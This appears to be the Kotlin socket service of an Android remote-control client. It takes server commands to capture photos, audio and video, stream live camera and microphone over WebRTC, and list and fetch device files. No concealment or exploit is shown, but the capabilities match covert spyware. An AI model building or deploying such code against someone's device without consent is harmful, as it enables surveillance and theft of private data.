package com.remotecontrol.client.service

import android.content.Context
import android.net.Uri
import android.util.Log
import com.remotecontrol.client.utils.PreferenceManager
import com.remotecontrol.client.webrtc.WebRTCManager
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.File
import java.net.URISyntaxException

class SocketService {
    private var socket: Socket? = null
    private var isConnected = false
    private var webRTCManager: WebRTCManager? = null
    private lateinit var context: Context
    
    companion object {
        private const val TAG = "SocketService"
    }
    
    fun connect(context: Context) {
        this.context = context
        try {
            val serverUrl = PreferenceManager.getServerUrl(context)
            val token = PreferenceManager.getToken(context)
            val deviceId = PreferenceManager.getDeviceId(context)
            
            val options = IO.Options()
            options.auth = mapOf(
                "token" to token,
                "device_id" to deviceId,
                "type" to "device"
            )
            
            socket = IO.socket(serverUrl, options)
            webRTCManager = WebRTCManager(context, this)
            
            setupSocketListeners()
            socket?.connect()
            
        } catch (e: URISyntaxException) {
            Log.e(TAG, "Socket URI error", e)
        }
    }
    
    fun reconnect(context: Context) {
        disconnect()
        connect(context)
    }
    
    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        socket = null
        isConnected = false
    }
    
    fun isConnected(): Boolean {
        return isConnected && socket?.connected() == true
    }
    
    fun emit(event: String, data: JSONObject) {
        socket?.emit(event, data)
    }
    
    private fun setupSocketListeners() {
        socket?.on(Socket.EVENT_CONNECT) {
            Log.d(TAG, "Socket connected")
            isConnected = true
            onConnected()
        }
        
        socket?.on(Socket.EVENT_DISCONNECT) {
            Log.d(TAG, "Socket disconnected")
            isConnected = false
            onDisconnected()
        }
        
        socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
            Log.e(TAG, "Socket connection error: ${args[0]}")
            onConnectionError(args[0].toString())
        }
        
        // 监听远程控制指令
        socket?.on("take_photo") { args ->
            handleTakePhoto(args[0] as JSONObject)
        }
        
        socket?.on("record_audio") { args ->
            handleRecordAudio(args[0] as JSONObject)
        }
        
        socket?.on("record_video") { args ->
            handleRecordVideo(args[0] as JSONObject)
        }
        
        socket?.on("start_live_audio") { args ->
            handleStartLiveAudio(args[0] as JSONObject)
        }
        
        socket?.on("stop_live_audio") {
            handleStopLiveAudio()
        }
        
        socket?.on("start_live_video") { args ->
            handleStartLiveVideo(args[0] as JSONObject)
        }
        
        socket?.on("stop_live_video") {
            handleStopLiveVideo()
        }
        
        socket?.on("switch_camera") { args ->
            handleSwitchCamera(args[0] as JSONObject)
        }
        
        // WebRTC相关事件监听
        socket?.on("webrtc_answer") { args ->
            handleWebRTCAnswer(args[0] as JSONObject)
        }
        
        socket?.on("webrtc_ice_candidate") { args ->
            handleWebRTCIceCandidate(args[0] as JSONObject)
        }
        
        // 文件管理相关事件监听
        socket?.on("get_file_list") { args ->
            handleGetFileList(args[0] as JSONObject)
        }
        
        socket?.on("get_file_info") { args ->
            handleGetFileInfo(args[0] as JSONObject)
        }
        
        socket?.on("download_file") { args ->
            handleDownloadFile(args[0] as JSONObject)
        }
    }
    
    private fun onConnected() {
        Log.d(TAG, "Socket connection established")
    }
    
    private fun onDisconnected() {
        Log.d(TAG, "Socket connection lost")
    }
    
    private fun onConnectionError(error: String) {
        Log.e(TAG, "Socket connection error: $error")
    }
    
    private fun handleTakePhoto(data: JSONObject) {
        Log.d(TAG, "Received take_photo command: $data")
        val taskId = data.getString("task_id")
        val camera = data.optString("camera", "back")
        val quality = data.optString("quality", "high")
        
        RemoteControlService.takePhoto(taskId, camera, quality)
    }
    
    private fun handleRecordAudio(data: JSONObject) {
        Log.d(TAG, "Received record_audio command: $data")
        val taskId = data.getString("task_id")
        val duration = data.getInt("duration")
        val quality = data.optString("quality", "high")
        
        RemoteControlService.recordAudio(taskId, duration, quality)
    }
    
    private fun handleRecordVideo(data: JSONObject) {
        Log.d(TAG, "Received record_video command: $data")
        val taskId = data.getString("task_id")
        val duration = data.getInt("duration")
        val camera = data.optString("camera", "back")
        val quality = data.optString("quality", "high")
        
        RemoteControlService.recordVideo(taskId, duration, camera, quality)
    }
    
    private fun handleStartLiveAudio(data: JSONObject) {
        Log.d(TAG, "Received start_live_audio command: $data")
        val taskId = data.getString("task_id")
        
        RemoteControlService.startLiveAudio(taskId)
        webRTCManager?.startLiveAudio(taskId)
    }
    
    private fun handleStopLiveAudio() {
        Log.d(TAG, "Received stop_live_audio command")
        RemoteControlService.stopLiveAudio()
        webRTCManager?.stopLiveAudio()
    }
    
    private fun handleStartLiveVideo(data: JSONObject) {
        Log.d(TAG, "Received start_live_video command: $data")
        val taskId = data.getString("task_id")
        
        RemoteControlService.startLiveVideo(taskId)
        webRTCManager?.startLiveVideo(taskId)
    }
    
    private fun handleStopLiveVideo() {
        Log.d(TAG, "Received stop_live_video command")
        RemoteControlService.stopLiveVideo()
        webRTCManager?.stopLiveVideo()
    }
    
    private fun handleSwitchCamera(data: JSONObject) {
        Log.d(TAG, "Received switch_camera command: $data")
        val camera = data.getString("camera")
        
        RemoteControlService.switchCamera(camera)
        webRTCManager?.switchCamera(camera)
    }
    
    private fun handleWebRTCAnswer(data: JSONObject) {
        Log.d(TAG, "Received WebRTC answer: $data")
        val sdp = data.getString("sdp")
        webRTCManager?.handleAnswer(sdp)
    }
    
    private fun handleWebRTCIceCandidate(data: JSONObject) {
        Log.d(TAG, "Received WebRTC ICE candidate: $data")
        val sdpMid = data.getString("sdpMid")
        val sdpMLineIndex = data.getInt("sdpMLineIndex")
        val sdp = data.getString("candidate")
        webRTCManager?.handleIceCandidate(sdpMid, sdpMLineIndex, sdp)
    }
    
    private fun handleGetFileList(data: JSONObject) {
        try {
            val taskId = data.getString("task_id")
            val directoryPath = if (data.has("path")) data.getString("path") else null
            val accessType = if (data.has("access_type")) data.getString("access_type") else "saf"
            
            val fileManagerService = FileManagerService(context)
            val result = when (accessType) {
                "media" -> {
                    val mediaType = data.optString("media_type", "image")
                    fileManagerService.getMediaFiles(mediaType)
                }
                "saf" -> {
                    val treeUriString = PreferenceManager.getStorageUri(context)
                    val treeUri = if (treeUriString.isNotEmpty()) Uri.parse(treeUriString) else null
                    val directoryUri = if (directoryPath != null) Uri.parse(directoryPath) else null
                    fileManagerService.getFileListWithSAF(treeUri, directoryUri)
                }
                else -> {
                    JSONObject().apply {
                        put("success", false)
                        put("message", "不支持的访问类型")
                    }
                }
            }
            
            result.put("task_id", taskId)
            emit("file_list_result", result)
            Log.d(TAG, "File list result sent: $result")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling get_file_list", e)
        }
    }
    
    private fun handleGetFileInfo(data: JSONObject) {
        try {
            val taskId = data.getString("task_id")
            val filePath = data.getString("path")
            
            val fileManagerService = FileManagerService(context)
            val result = fileManagerService.getFileInfo(filePath)
            result.put("task_id", taskId)
            
            emit("file_info_result", result)
            Log.d(TAG, "File info result sent: $result")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling get_file_info", e)
        }
    }
    
    private fun handleDownloadFile(data: JSONObject) {
        try {
            val taskId = data.getString("task_id")
            val filePath = data.getString("path")
            
            val file = File(filePath)
            if (!file.exists() || !file.isFile || !file.canRead()) {
                val errorResult = JSONObject()
                errorResult.put("task_id", taskId)
                errorResult.put("success", false)
                errorResult.put("message", "文件不存在或无法读取")
                emit("download_file_result", errorResult)
                return
            }
            
            val prepareResult = JSONObject()
            prepareResult.put("task_id", taskId)
            prepareResult.put("success", true)
            prepareResult.put("file_name", file.name)
            prepareResult.put("file_size", file.length())
            prepareResult.put("file_path", filePath)
            emit("download_file_prepare", prepareResult)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling download_file", e)
        }
    }
}